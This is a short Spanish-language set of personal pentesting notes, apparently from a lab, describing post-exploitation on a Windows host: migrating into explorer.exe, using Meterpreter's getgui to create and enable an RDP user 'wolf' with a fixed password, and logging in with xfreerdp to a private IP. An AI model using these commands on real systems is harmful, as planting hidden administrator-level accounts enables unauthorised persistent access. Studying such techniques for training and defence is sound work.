Una vez dentro, tenemos que ser el usuario administrador y mirarnos al proceso de explorer.exe:
![[Mis apuntes/ANEXOS/Pasted image 20230801124356.png]]
![[Mis apuntes/ANEXOS/Pasted image 20230801124529.png]]
Una vez migrado, tenemos que crear un usuario para el protocolo RDP y activarlo:
```bash
run getgui -e -u wolf -p hack_123
```
![[Pasted image 20240513085004.png]]
Una vez hecho esto, ya podremos entrar dentro del protocolo RDP usando estas credenciales con la herramienta xfreerdp:
```bash
xfreerdp /u:wolf /p:hack_123 /v:10.2.20.12
```
![[Pasted image 20240513085544.png]]
